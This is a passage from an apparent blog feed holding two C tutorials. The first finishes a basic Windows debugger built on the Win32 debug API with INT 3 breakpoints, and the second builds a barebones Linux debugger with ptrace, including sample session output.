&lt;p&gt;As you can see here, there are four main debugging events that we will be dealing with (there are more, but these are the only ones we need for creating a basic debugger). Each of these events will call a different user-defined function, which will take appropriate action for dealing with that case. I will start by explaining the simplest one, which is the ExitDebuggeeProcess() function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Called when the debuggee exits
void ExitDebuggeeProcess(DEBUG_EVENT debug_event) {
    printf(&quot;Process exited with code %d (0x%x).\n&quot;, debug_event.u.ExitProcess.dwExitCode, debug_event.u.ExitProcess.dwExitCode);
    cont = 0; // Stop the debugger
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function is called whenever we receive an EXIT_PROCESS_DEBUG_EVENT, which as you can probably guess by the name, indicates that the debuggee has exited. The function code is simple: we just tell the user what the exit code is (both in decimal and in hex), and then we set cont to zero, which will stop the while loop that we had created in main.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Allocates memory on the heap
void *mymalloc(int size) {
    void *mem = malloc(size);
    if(mem == NULL) {
        printf(&quot;Error allocating memory on the heap.&quot;);
        exit(0);
    }
    return mem;
}

// Called when the debuggee outputs a debug string
void OutputString(DEBUG_EVENT debug_event) {
    // Obtains information (including a pointer) about the string being printed
    // Note that this pointer is only valid on the debuggee's process, but not on the debugger's process
    // So we'll have to read from the debuggee's process and copy that string's value into a string in our process
    OUTPUT_DEBUG_STRING_INFO DebugString = debug_event.u.DebugString;

    // Create space on the heap to store the string being printed
    char* str = mymalloc(DebugString.nDebugStringLength);

    // Read the string from the debuggee's memory and print it
    ReadProcessMemory(pi.hProcess, DebugString.lpDebugStringData, str, DebugString.nDebugStringLength, NULL);
    printf(&quot;Debug String Received: %s\n&quot;, str);

    // Free the heap
    free(str);
    str = NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The other simple function is executed when we receive OUTPUT_DEBUG_STRING_EVENT, which is thrown if the debuggee process sends the debugger process a debug string. This can happen if the debuggee calls a function such as &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa&quot;&gt;OutputDebugStringA()&lt;/a&gt;, which will indicate to the system that the debuggee wants to send a string to the debugger. This debug event will set debug_event.u.DebugString equal to a pointer to the string that needs to be printed out. There is one problem with this pointer: it points to a memory address that is on another process and therefore won’t directly work as a string. We can deal with this problem by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory&quot;&gt;ReadProcessMemory()&lt;/a&gt; function, which allows us to copy bytes from another process into an array in our process. From there, it is easy to just print out the string that was received and move on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static CREATE_PROCESS_DEBUG_INFO pInfo = {0}; // Contains information about the process creation

// Called when the debuggee process is being created
void ProcessCreation(DEBUG_EVENT debug_event) {
    // Obtain information about the process's creation
    pInfo = debug_event.u.CreateProcessInfo;

    // Add a breakpoint at the start address
    printf(&quot;Setting a breakpoint at the start address...\n&quot;);
    AddBreakpoint(pInfo.lpStartAddress);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ProcessCreation() function is called when we receive a CREATE_PROCESS_DEBUG_EVENT, which is always received by the debugger right before the debuggee first begins execution. The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-create_process_debug_info&quot;&gt;CREATE_PROCESS_DEBUG_INFO struct&lt;/a&gt; will contain important information about the process that we will need to access later. This information is given to us via debug_event.u.CreateProcessInfo. One of the pieces of data that the CREATE_PROCESS_DEBUG_INFO struct will contain is the start address of the program. It is vital for us to set a breakpoint at the start address so that the person using the debugger can run commands at that point. Note that the start address of a program is not necessarily the first line of code the debuggee process will execute; there is usually some overhead code that is executed even before we get to start executing the start address.&lt;/p&gt;

&lt;p&gt;Before I show you the code for AddBreakpoint(), I need to show you the basic idea behind setting breakpoints. The “INT 3” assembly instruction (0xCC in hex) will generate a system interrupt that will tell the operating system that a debugging event has occurred. More specifically, once a process reads the instruction 0xCC, it will tell the debugger that an exception has occurred, and the debug event associated with that exception will indicate to the debugger that we have hit a breakpoint. These are the steps that we need to do in order to setup a breakpoint:&lt;/p&gt;
&lt;ol&gt;
    &lt;li&gt;Figure out which line we want to set the breakpoint.&lt;/li&gt;
    &lt;li&gt;Read the first byte at the address where we want to set the breakpoint.&lt;/li&gt;
    &lt;li&gt;Store the address of the line and the original value of the first byte in a linked list.&lt;/li&gt;
    &lt;li&gt;Replace the first byte of the address where we want to set the breakpoint with 0xCC.&lt;/li&gt;
    &lt;li&gt;Continue execution and wait until the debuggee has hit the breakpoint.&lt;/li&gt;
    &lt;li&gt;Push RIP backwards by one byte (RIP would have moved forward as soon as it read INT 3).&lt;/li&gt;
    &lt;li&gt;Search the linked list until we find a node with its address equal to RIP and obtain the original value of the first byte.&lt;/li&gt;
    &lt;li&gt;Delete the node from the linked list.&lt;/li&gt;
    &lt;li&gt;Change the first byte of the address back to its original value (which would've been saved in the linked list).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Make sure you understand these steps before moving on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Contains information for a single breakpoint (used as a linked list)
typedef struct _breakpoint {
    char byte; // Contains the byte that will be overwritten with INT 3
    struct _breakpoint *next; // Contains the next value in the linked list
    void *addr; // Contains the address that the breakpoint is at
} Breakpoint;
static Breakpoint *head = NULL; // Head of the linked list of breakpoints

// Adds a breakpoint to the linked list of breakpoints
void AddBreakpoint(void *addr) {
    // Create space on the heap for this breakpoint
    Breakpoint *b = mymalloc(sizeof(Breakpoint));
    b-&amp;gt;addr = addr;

    // Get the byte that we want to replace with INT 3 and store it in b.byte
    ReadProcessMemory(pInfo.hProcess, addr, &amp;amp;(b-&amp;gt;byte), 1, NULL);

    // Insert an INT 3 (0xCC) instruction
    char byte = 0xCC;
    WriteProcessMemory(pInfo.hProcess, addr, &amp;amp;byte, 1, NULL);
    FlushInstructionCache(pInfo.hProcess, addr, 1);

    // Insert this into the linked list
    b-&amp;gt;next = head;
    head = b;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our struct for breakpoints needs to store three values: the original value of the byte that will be overwritten with INT 3, the next value in the linked list, and the address of the breakpoint. The AddBreakpoint() function is used to deal with steps one through four. It starts off by allocating memory for the breakpoint and saving the address of that breakpoint. We then use ReadProcessMemory() to store the value of the very first byte into b-&amp;gt;byte. Then we use &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory()&lt;/a&gt; to overwrite the byte that we just read with INT 3. Because it is possible that the CPU has already started to load the next instruction, we must call &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache&quot;&gt;FlushInstructionCache()&lt;/a&gt; to ensure that our changes are made. Finally, we add this breakpoint to the linked list.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Called when the debuggee receives an exception
void ProcessException(DEBUG_EVENT debug_event) {
    // Look at the status for the exception
    int code = debug_event.u.Exception.ExceptionRecord.ExceptionCode;
    switch(code) {
        case STATUS_BREAKPOINT: // Called when the exception was caused by a breakpoint
            ProcessBreakpoint(debug_event);
            break;
        default:
            printf(&quot;Exception %d (0x%x) received.\n&quot;, code, code);
            ProcessCommands(); // Allow the user to type in commands into the debugger
            break;    
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our next function, ProcessException(), is used to deal with step five, and it is called whenever EXCEPTION_DEBUG_EVENT is received. If the exception code for the exception indicates that we have hit a breakpoint, then we will call ProcessBreakpoint() to deal with this breakpoint. Else, we will just print out the exception number in both decimal and hex. The ProcessCommands() function will be shown a little later, and it will be used to allow the user to type commands into the debugger.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void ProcessBreakpoint(DEBUG_EVENT debug_event) {
    if(head != NULL) { // Do nothing if the head of the breakpoint linked list is NULL
        // Get the value of RIP
        CONTEXT lcContext;
        lcContext.ContextFlags = CONTEXT_ALL;
        GetThreadContext(pInfo.hThread, &amp;amp;lcContext); // Obtains the thread context (which contains info about registers)
        lcContext.Rip--; // Move RIP back one byte (RIP would've moved forward as soon as it read INT 3)

        // Find the breakpoint in the linked list, obtain the byte that was originally there and its address, and delete the node from the linked list
        char byte = 0;
        void *addr = NULL;
        char found = 1; // This is set to zero if we did not find the correct byte
        if(head-&amp;gt;addr == (void *) lcContext.Rip) { // Triggered if the head is the breakpoint we're looking for
            byte = head-&amp;gt;byte; // Save the byte
            addr = head-&amp;gt;addr; // Save the address

            // Delete the head
            Breakpoint *del = head;
            head = head-&amp;gt;next;
            free(del);
        } else { // Else, loop until we find the correct breakpoint
            Breakpoint *b = head;
            while(b-&amp;gt;next != NULL &amp;amp;&amp;amp; b-&amp;gt;next-&amp;gt;addr != (void *) lcContext.Rip) {
                b = b-&amp;gt;next;
            }
            if(b-&amp;gt;next != NULL) {
                byte = b-&amp;gt;next-&amp;gt;byte; // Save the byte
                addr = b-&amp;gt;next-&amp;gt;addr; // Save the address

                // delete the correct node
                Breakpoint *del = b-&amp;gt;next;
                b-&amp;gt;next = del-&amp;gt;next;
                free(del);
            } else { // If this else statement hits, then we did not find the breakpoint in the linked list, and we will just ignore it
                found = 0;
            }
        }
        if(found) {
            // Indicate that we have hit a breakpoint
            dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED; // The debuggee should not handle this exception
            printf(&quot;Hit a breakpoint!\n&quot;);

            // Apply the change to RIP (which was moved one byte backwards earlier)
            SetThreadContext(pInfo.hThread, &amp;amp;lcContext);

            // Replace the INT 3 instruction with the byte that was originally there
            WriteProcessMemory(pInfo.hProcess, addr, &amp;amp;byte, 1, NULL);
            FlushInstructionCache(pInfo.hProcess, addr, 1);

            // Allow the user to type in commands into the debugger
            ProcessCommands();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This next function is long, but it will allow us to deal with steps six through nine for dealing with breakpoints. First we will check whether the head is NULL, and if it is NULL, then we will do nothing. We must do this check because usually the operating system automatically sets a breakpoint at the start of wherever the process first starts executing (which, by the way, is not necessarily the start address because there is some overhead involved with execution), and we do not want to do anything with this first breakpoint.&lt;/p&gt;

&lt;p&gt;If the check passes, then we will get the value of RIP by using &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext&quot;&gt;GetThreadContext()&lt;/a&gt;, which requires a pointer to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&quot;&gt;CONTEXT&lt;/a&gt; struct. The CONTEXT struct is used to store information about a thread’s context, and it should contain the values of various registers. Once we obtain Rip from the CONTEXT struct, we must subtract it by one to move it backwards (but we won’t apply these changes to the debuggee until once we are sure that the current address is inside of the breakpoint linked list).&lt;/p&gt;

&lt;p&gt;The next step is to find the node in the linked list that contains an addr value that is equal to the current value of RIP. Once we find the correct node, we will save the value of the original byte, and we will save the value of addr. We can delete the node from the linked list of breakpoints after that. The code for doing this should be simple to understand if you understand how linked lists work.&lt;/p&gt;

&lt;p&gt;If we have found the node in the linked list, then there are a few more steps that we need to take care of. First, we must set dwContinueStatus equal to DBG_EXCEPTION_NOT_HANDLED, which will tell the system that the debuggee should not handle this exception. Next, we have to apply our changes to RIP by calling &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext&quot;&gt;SetThreadContext()&lt;/a&gt; with our modified context as a parameter. We can then replace the INT 3 instruction with the byte that was originally there by using WriteProcessMemory() and FlushInstructionCache(). Finally, we will allow the user to type in commands into the debugger by calling the ProcessCommands() function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Allows the user to type in commands into the debugger
void ProcessCommands() {
    char *cmd = mymalloc(200); // The command that the user types in
    while(strncmp(cmd, &quot;continue&quot;, 8) != 0 &amp;amp;&amp;amp; strncmp(cmd, &quot;cont&quot;, 4) != 0) {
        printf(&quot;&amp;gt; &quot;);
        fgets(cmd, 200, stdin); // Read a line

        if(strncmp(cmd, &quot;registers&quot;, 9) == 0 || strncmp(cmd, &quot;regs&quot;, 4) == 0) {
            PrintRegs(); // Prints out all of the values of the registers
        } else if(strncmp(cmd, &quot;break &quot;, 6) == 0 || strncmp(cmd, &quot;b &quot;, 2) == 0) {
            strtok(cmd, &quot; &quot;); // The value after the space should be the address in hex
            AddBreakpoint((void *) strtoll(strtok(NULL, &quot; &quot;), 0, 16)); // Adds a breakpoint at that address
        } else if(strncmp(cmd, &quot;mem &quot;, 4) == 0) {
            strtok(cmd, &quot; &quot;);
            char *a = strtok(NULL, &quot; &quot;); // The value after the first space should be the address in hex
            char *b = strtok(NULL, &quot; &quot;); // The value after the second space should be the number of bytes to read in decimal
            ReadMemory(a, atoi(b)); // Read from the given memory address
        } else if(strncmp(cmd, &quot;quit&quot;, 4) == 0 || strncmp(cmd, &quot;q&quot;, 1) == 0 || strncmp(cmd, &quot;exit&quot;, 4) == 0) {
            printf(&quot;Debugger will now exit.\n&quot;); // Exit the program
            exit(0);
        } else if(strncmp(cmd, &quot;help&quot;, 4) == 0) {
            printf(&quot;continue: Continues execution.\n&quot;);
            printf(&quot;registers: Prints out the values of all of the registers.\n&quot;);
            printf(&quot;break &amp;lt;addr&amp;gt;: Sets a breakpoint at a given address.\n&quot;);
            printf(&quot;mem &amp;lt;addr&amp;gt; &amp;lt;bytes&amp;gt;: Reads a given number of bytes from a given memory address.\n&quot;);
            printf(&quot;quit: Closes the debugger.\n&quot;);
        }
    }
    
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ProcessCommands() function has six commands: help, continue, registers, break, mem, and quit. The help command shows more details for what each command does and what their parameters are. This function is mainly used to process input that the user types in and select the correct function to call.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the values of the registers
void PrintRegs() {
    // Read the registers
    CONTEXT lcContext;
    lcContext.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pInfo.hThread, &amp;amp;lcContext);
    
    // Print out all of the values of the registers
    printf(&quot;RAX: 0x%llx\n&quot;, lcContext.Rax);
    printf(&quot;RBX: 0x%llx\n&quot;, lcContext.Rbx);
    printf(&quot;RCX: 0x%llx\n&quot;, lcContext.Rcx);
    printf(&quot;RDX: 0x%llx\n&quot;, lcContext.Rdx);
    printf(&quot;RSP: 0x%llx\n&quot;, lcContext.Rsp);
    printf(&quot;RBP: 0x%llx\n&quot;, lcContext.Rbp);
    printf(&quot;RSI: 0x%llx\n&quot;, lcContext.Rsi);
    printf(&quot;RDI: 0x%llx\n&quot;, lcContext.Rdi);
    printf(&quot;R8: 0x%llx\n&quot;, lcContext.R8);
    printf(&quot;R9: 0x%llx\n&quot;, lcContext.R9);
    printf(&quot;R10: 0x%llx\n&quot;, lcContext.R10);
    printf(&quot;R11: 0x%llx\n&quot;, lcContext.R11);
    printf(&quot;R12: 0x%llx\n&quot;, lcContext.R12);
    printf(&quot;R13: 0x%llx\n&quot;, lcContext.R13);
    printf(&quot;R14: 0x%llx\n&quot;, lcContext.R14);
    printf(&quot;R15: 0x%llx\n&quot;, lcContext.R15);
    printf(&quot;RIP: 0x%llx\n&quot;, lcContext.Rip);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PrintRegs() is used to print out all of the values of the registers. I had already explained how to read the value of RIP when I went over how ProcessBreakpoint() worked, so reading the values of all of the registers should be pretty self-explanatory by this point.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads n bytes from the given memory address
void ReadMemory(char *addr_hex, int n) {
    // Convert the address from a hex string into a DWORD64
    long long addr = strtoll(addr_hex, 0, 16);
    printf(&quot;Reading memory from address 0x%llx...\n&quot;, addr);

    // Read n bytes from the given memory address
    char *buf = mymalloc(n);
    ReadProcessMemory(pInfo.hProcess, (LPCVOID) addr, buf, n, NULL);

    // Loop through each byte in the buffer and print it out
    for(int i = 0; i &amp;lt; n; i++) {
        printf(&quot;0x%x &quot;, buf[i]);
    }
    printf(&quot;\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The last function that I need to go over is ReadMemory(). I had already gone over how ReadProcessMemory() worked when I went over how OutputString() worked, so this should also be self-explanatory by this point.&lt;/p&gt;

&lt;p&gt;We are finally done building our debugger! You can see the entire code &lt;a href=&quot;https://github.com/nihaal-prasad/Barebones-Windows-Debugger/blob/master/debugger.c&quot;&gt;here&lt;/a&gt; if you want to see it all at once.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry><entry><title type="html">Creating a Barebones Linux Debugger</title><link href="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Linux Debugger" /><published>2020-03-07T00:00:00-05:00</published><updated>2020-03-07T00:00:00-05:00</updated><id>http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;

&lt;p&gt;The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_TRACEME, 0, 0, 0);&lt;/code&gt;, which will let the child process know that it is going to be debugged by the parent process. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace()&lt;/code&gt; function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Represents the PID of the program being debugged
static int pid = 0;

// Forks this process, runs the given executable using the given arguments, and returns the PID to the parent
int run(char **argv) {
    pid = fork();

    // If statement will only execute if we are the child process
    if(pid == 0) {
        ptrace(PTRACE_TRACEME, 0, 0, 0); // Allow the parent to trace us
        execv(argv[1], &amp;amp;(argv[2])); // Execute the program we wanted to execute.
        // The tracee should stop on SIGTRAP as soon as execv() is called.
        // This will prevent the tracee from executing any code unless the tracer allows it to using ptrace()
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, the child process has the program that we want to debug loaded up into it, and it has paused execution so that we can start to take control of it as its parent process. Inside our main function, we need to obtain the program that we must run from the command line arguments and call run(). Then we will also use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL);&lt;/code&gt; on the parent process so that if the parent exits, then the child process must also exit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Main function
int main(int argc, char **argv) {
    // Make sure we have the correct number of arguments
    if(argc != 2) {
        printf(&quot;Usage: ./debug &amp;lt;program&amp;gt; &amp;lt;additional arguments&amp;gt;\n&quot;);
        exit(0);
    }

    run(argv); // Run the given executable and obtain its PID
    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_EXITKILL); // Make sure that if the tracer exits, then the tracee must also exit
    debugger(pid); // Run the debugger
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The debugger() function is a function that I made to help me process commands inputted by the user. It will parse the command the user types in and calls the correct function to do the action that the user requested. I also made a print_help() function that will print out all of the possible commands that can be used.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads a line of input
void readline(char *input) {
    // Reads a line of input
    char buf[500];
    printf(&quot;&amp;gt; &quot;);
    fgets(input, 500, stdin);

    // Get rid of the '\n' character
    int len = strlen(input);
    if(len &amp;gt;= 2 &amp;amp;&amp;amp; input[len-1] == '\n') {
        input[len-1] = '\0';
    }
}

// Prints the help menu
void print_help() {
    printf(&quot;regs: Prints out the values of each register.\n&quot;);
    printf(&quot;step: Executes a single instruction.\n&quot;);
    printf(&quot;mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.\n&quot;);
    printf(&quot;quit: Closes the debugger.\n&quot;);
}

// Actual debugger code
void debugger() {
    char *input = malloc(500); // Input that the user types in

    // Loop until the user types in &quot;exit&quot;
    do {
        readline(input); // Read a command

        // Parse the command
        if(strncmp(&quot;regs&quot;, input, 5) == 0 || strncmp(&quot;r&quot;, input, 2) == 0) {
            print_regs();
        } else if(strncmp(&quot;step&quot;, input, 5) == 0 || strncmp(&quot;s&quot;, input, 2) == 0) {
            step();
        } else if(strncmp(&quot;mem &quot;, input, 4) == 0) {
            strtok(input, &quot; &quot;); // Mem should have a single input parameter, which is the memory address to read in hex
            read_mem(strtok(NULL, &quot; &quot;));
        } else if(strncmp(&quot;help&quot;, input, 5) == 0 || strncmp(&quot;h&quot;, input, 2) == 0) {
            print_help();
        }
    } while(strncmp(input, &quot;exit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;quit&quot;, 5) &amp;amp;&amp;amp; strncmp(input, &quot;q&quot;, 2));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that I will show you how to do is how to read the values of the registers in the debugged program. We will be using the &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs)&lt;/code&gt; function to read the values of the registers in the debugged program. The “regs” variable that we’ll use as an input parameter for this function has a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct user_regs_struct&lt;/code&gt;, and the ptrace() function will store the values of the registers inside of that variable. The values of the registers can then be easily read by using the regs variable (i.e. use &lt;code class=&quot;highlighter-rouge&quot;&gt;regs.rax&lt;/code&gt; to read the value of rax).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the register values inside of the process we're debugging
void print_regs() {
    // Create the struct that will contain all of the process' registers
    struct user_regs_struct regs;

    // Read the values of each register and store it inside of the struct
    ptrace(PTRACE_GETREGS, pid, 0, &amp;amp;regs);

    // Print out each value
    printf(&quot;rip 0x%llx\n&quot;, regs.rip);
    printf(&quot;rax 0x%llx\n&quot;, regs.rax);
    printf(&quot;rbx 0x%llx\n&quot;, regs.rbx);
    printf(&quot;rcx 0x%llx\n&quot;, regs.rcx);
    printf(&quot;rdx 0x%llx\n&quot;, regs.rdx);
    printf(&quot;rsi 0x%llx\n&quot;, regs.rsi);
    printf(&quot;rdi 0x%llx\n&quot;, regs.rdi);
    printf(&quot;rsp 0x%llx\n&quot;, regs.rsp);
    printf(&quot;rbp 0x%llx\n&quot;, regs.rbp);
    printf(&quot;r8 0x%llx\n&quot;, regs.r8);
    printf(&quot;r9 0x%llx\n&quot;, regs.r9);
    printf(&quot;r10 0x%llx\n&quot;, regs.r10);
    printf(&quot;r11 0x%llx\n&quot;, regs.r11);
    printf(&quot;r12 0x%llx\n&quot;, regs.r12);
    printf(&quot;r13 0x%llx\n&quot;, regs.r13);
    printf(&quot;r14 0x%llx\n&quot;, regs.r14);
    printf(&quot;r15 0x%llx\n&quot;, regs.r15);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To read any word from memory, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_PEEKDATA, pid, addr, 0)&lt;/code&gt;, where addr is a long representing the address that we want to read from. This function will return a long variable that we can then print out in hex.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads the value at the given memory address
void read_mem(char *addr_input) {
    // Make sure that the input isn't NULL
    if(addr_input != NULL) {
        long addr = strtol(addr_input, 0, 16); // Convert the address from a hex string to a long
        long data = ptrace(PTRACE_PEEKDATA, pid, addr, 0); // Obtain the data
        printf(&quot;%lx\n&quot;, data);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Stepping through a single line of assembly code is even easier. We can just call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_SINGLESTEP, pid, 0, 0);&lt;/code&gt;, which will just execute one line of code.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Steps through a single line of assembly code
void step() {
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we should have a working debugger. You can try using this to debug a basic program, and it should work just fine.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./debug todebug
&amp;gt; help
regs: Prints out the values of each register.
step: Executes a single instruction.
mem &amp;lt;addr&amp;gt;: Reads the value at the given memory address.
quit: Closes the debugger.
&amp;gt; regs
rip 0x7fcfb2eee090
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x0
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; mem 0x7fcfb2eee090
f98e8e78948
&amp;gt; step
&amp;gt; r
rip 0x7fcfb2eee093
rax 0x0
rbx 0x0
rcx 0x0
rdx 0x0
rsi 0x0
rdi 0x7fff2e69c670
rsp 0x7fff2e69c670
rbp 0x0
r8 0x0
r9 0x0
r10 0x0
r11 0x0
r12 0x0
r13 0x0
r14 0x0
r15 0x0
&amp;gt; q
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
